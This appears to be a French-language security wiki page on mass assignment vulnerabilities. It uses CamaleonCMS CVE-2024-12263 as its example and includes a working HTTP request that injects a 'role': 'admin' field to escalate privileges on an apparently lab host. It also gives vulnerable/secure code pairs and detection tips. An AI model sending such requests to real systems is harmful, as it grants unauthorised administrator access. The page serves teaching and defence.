# Mass Assignment Vulnerability

## <mark style="color:red;">Mass Assignment Vulnerability</mark>

### <mark style="color:blue;">Introduction</mark>

**Mass Assignment** (affectation en masse) est une vulnérabilité critique qui permet à un attaquant de modifier des attributs non prévus d'un objet en envoyant des paramètres supplémentaires dans une requête HTTP. Cette faille est particulièrement dangereuse dans les frameworks web modernes qui automatisent la liaison des paramètres HTTP aux objets de la base de données.

***

### <mark style="color:blue;">Concepts Fondamentaux</mark>

#### <mark style="color:green;">Qu'est-ce que le Mass Assignment ?</mark>

Le Mass Assignment se produit lorsqu'une application permet de modifier **tous les attributs** d'un objet sans vérifier lesquels sont autorisés. C'est comme avoir un formulaire avec des champs cachés que l'application accepte aveuglément.

**Analogie simple :**

```
Formulaire visible :
├── Nom : [____]
├── Email : [____]
└── Mot de passe : [____]

Formulaire caché (dans le code backend) :
├── Nom : [____]
├── Email : [____]
├── Mot de passe : [____]
├── Role : [____]  ← CACHÉ mais accepté !
└── is_admin : [____]  ← CACHÉ mais accepté !
```

Si l'application ne filtre pas les paramètres, un attaquant peut envoyer des champs supplémentaires pour modifier des attributs sensibles.

#### <mark style="color:green;">Exemple de Code Vulnérable</mark>

**Ruby on Rails (CamaleonCMS)**

```ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  # ⚠️ LIGNE DANGEREUSE !
  @user.update(params.require(:password).permit!)
  
  render inline: @user.errors.full_messages.join(', ')
  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```

**Analyse du code :**

1. **`params.require(:password)`** : Extrait uniquement le hash `:password`
2. **`.permit!`** : **LE PROBLÈME** - autorise **TOUS** les paramètres sans exception
3. **`@user.update(...)`** : Met à jour l'utilisateur avec tous les paramètres autorisés

Le `.permit!` désactive complètement la protection et accepte n'importe quel attribut envoyé par l'utilisateur.

***

### <mark style="color:blue;">Exploitation Pratique</mark>

#### Étape 1 : Situation Normale

**Requête légitime** pour changer le mot de passe :

```http
POST /admin/users/updated_ajax HTTP/1.1
Host: facts.htb
Content-Type: application/json
Cookie: _factsapp_session=abc123...

{
  "user_id": "5",
  "password": {
    "current_password": "oldpass",
    "new_password": "newpass123",
    "password_confirmation": "newpass123"
  }
}
```

**Résultat :** ✅ Mot de passe changé normalement.

#### Étape 2 : Exploitation (Escalade de Privilèges)

**Requête malveillante** avec paramètre `role` :

```http
POST /admin/users/updated_ajax HTTP/1.1
Host: facts.htb
Content-Type: application/json
Cookie: _factsapp_session=abc123...

{
  "user_id": "5",
  "password": {
    "current_password": "oldpass",
    "new_password": "newpass123",
    "password_confirmation": "newpass123",
    "role": "admin"  ← PARAMÈTRE MALVEILLANT !
  }
}
```

**Ce qui se passe :**

1. Le serveur trouve l'utilisateur ID=5 (utilisateur normal)
2. Applique `params.require(:password).permit!`
   * Extrait : `{current_password: "oldpass", new_password: "newpass123", password_confirmation: "newpass123", role: "admin"}`
   * Autorise : **TOUT** (`.permit!`)
3.  Met à jour l'utilisateur :

    ```ruby
    @user.password = "newpass123"@user.role = "admin"  ← ESCALADE DE PRIVILÈGES !
    ```

**Résultat :** ❌ L'utilisateur normal devient **ADMIN** !

#### Étape 3 : Vérification

Après avoir changé le mot de passe avec le paramètre `role`, l'utilisateur peut :

```bash
# Se déconnecter et se reconnecter
curl -X GET https://facts.htb/admin/dashboard \
  -H "Cookie: _factsapp_session=xyz789..."
```

L'accès au panneau d'administration est désormais accordé avec les privilèges administrateur.

***

### <mark style="color:blue;">Cas d'Usage Réels</mark>

#### <mark style="color:green;">CamaleonCMS (CVE-2024-12263)</mark>

**Vulnérabilité :** Escalade de privilèges via Mass Assignment dans la fonction de changement de mot de passe.

**Impact :**

* Un utilisateur authentifié peut devenir administrateur
* Accès complet au panneau d'administration
* Possibilité de modifier la configuration du site
* Récupération de credentials AWS S3

**Version affectée :** CamaleonCMS < 2.8.2

#### Autres Frameworks Vulnérables

**Ruby on Rails :**

```ruby
# ❌ Vulnérable
User.update(params[:user].permit!)

# ✅ Sécurisé
User.update(params[:user].permit(:name, :email))
```

**Laravel (PHP) :**

```php
// ❌ Vulnérable
$user->update($request->all());

// ✅ Sécurisé
$user->update($request->only(['name', 'email']));
```

**Django (Python) :**

```python
# ❌ Vulnérable
user.__dict__.update(request.POST)

# ✅ Sécurisé
user.name = request.POST.get('name')
user.email = request.POST.get('email')
```

***

### <mark style="color:blue;">Détection</mark>

#### Indicateurs de Vulnérabilité

1. **Code source :**
   * Présence de `.permit!` (Rails)
   * Utilisation de `.all()` ou `->all()` (Laravel)
   * Assignation directe de `request.POST` (Django)
2. **Tests manuels :**
   * Intercepter une requête de modification de profil avec Burp Suite
   * Ajouter des paramètres comme `role`, `is_admin`, `permissions`
   * Vérifier si ces attributs sont modifiés
3.  **Tests automatisés :**

    ```bash
    # Utiliser nuclei avec un template Mass Assignment
    nuclei -u https://target.com -t mass-assignment.yaml
    ```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
